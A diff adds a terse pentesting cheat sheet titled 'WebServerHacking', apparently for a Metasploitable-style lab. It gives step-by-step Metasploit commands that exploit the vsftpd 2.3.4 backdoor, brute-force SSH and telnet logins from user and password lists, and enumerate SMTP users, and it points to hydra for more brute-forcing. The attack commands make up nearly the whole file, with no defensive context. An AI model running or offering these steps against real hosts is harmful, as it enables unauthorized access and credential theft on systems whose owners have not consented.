@@ -1,0 +1,84 @@
+=========================WebServerHacking========================
+
+# Exploiting FTP Service Running
+----------------------------------------------
+
+1).
+
+--> ftp <ip>
+--> ftp 192.168.0.12 (direct login if anonymous login allow)
+
+2).
+--> service postgresql start 
+--> msfconsole
+--> search vsftpd 2.3.4
+--> exploit/unix/ftp/vsftpd_234_backdoor 
+--> options
+--> set rhosts 192.168.174.137
+--> set rport 21
+--> exploit
+
+
+# Exploiting SSH Service
+----------------------------------------------
+
+1).
+--> msfconsole 
+--> auxiliary/scanner/ssh/ssh_login
+--> options
+--> set rhosts 192.168.174.137
+--> set VERBOSE true
+--> set STOP_ON_SUCCESS true
+--> set user_file user.txt
+--> set pass_file pass.txt
+--> set rport 22
+--> exploit 
+--> then you get available usernames and password \
+
+After you get credentials then we gain access thought ssh 
+
+2).
+--> ssh <user>@<ip>
+--> ssh msfadmin@192.168.174.137
+
+3).
+--> ssh -l <UserName> <ip> -p <PortNO.>
+--> ssh -l msfadmin 192.168.174.137 -p (default ssh run on port 22 but if it is not set deafult then change it with -p <port No.>  (-p 200))
+
+
+# Exploiting telnet Service
+------------------------------------------------
+1). First Method Bruteforcing:--
+--> use auxiliary/scanner/telnet/telnet_login 
+--> show options
+--> set RHOSTS 192.168.1.2
+--> set VERBOSE true
+--> set USER_FILE /root/Desktop/user.txt
+--> set PASS_FILE /root/Desktop/pass.txt
+--> set STOP_ON_Success true
+--> run
+
+2). Telnet
+--> telnet 192.168.1.2
+--> give username and password then you get access
+   
+# Exploiting SMTP service
+-----------------------------------------------
+1). 
+--> msfconsole
+--> use auxiliary/scanner/smtp/smtp_enum 
+--> set rhosts 192.168.174.137
+--> set rport 25
+--> set threads 5
+--> set user_file /root/user.txt
+
+we can also use hydra for brute force username and password !!!
+
+https://distrosea.com/view/
+
+
+
+
+
+
+
